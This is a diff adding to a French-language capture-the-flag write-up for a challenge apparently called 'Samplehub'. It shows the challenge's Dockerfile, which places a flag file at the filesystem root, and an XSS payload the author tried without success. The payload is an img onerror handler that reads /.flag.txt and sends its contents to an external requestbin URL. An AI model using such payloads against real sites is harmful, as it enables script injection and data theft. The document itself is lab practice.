@@ -28,3 +28,24 @@ si l'on regarde burp on voit notre payload qui était interprété
 
 on peut donc forward la requete et revenir sur la page pour constater
 <img width="1337" alt="Screenshot 2024-10-26 at 21 39 28" src="https://github.com/user-attachments/assets/885b8d1e-14e8-404e-a40e-ea94866ce00b">
+
+Si on telecharge le dossier 'Samplehub', nous apercevons un fichier dockerfile 
+```
+FROM alpine:3.20.3
+
+WORKDIR /usr/app
+COPY ./src/ .
+COPY ./.flag.txt /.flag.txt
+RUN apk add --update --no-cache nodejs npm && \
+    npm install
+
+USER guest
+CMD ["/usr/bin/node", "/usr/app/app.js"]
+
+```
+
+voici la dernière requête que j'ai essayé (en utilisant requestbin)
+```
+<img src=\"x\" onerror=\"fetch('/.flag.txt').then(response => response.text()).then(data => fetch('https://en0tbczn71ofmh.x.pipedream.net/?flag=' + encodeURIComponent(data))).catch(err => console.error(err));\">
+```
+Mais sans succès 
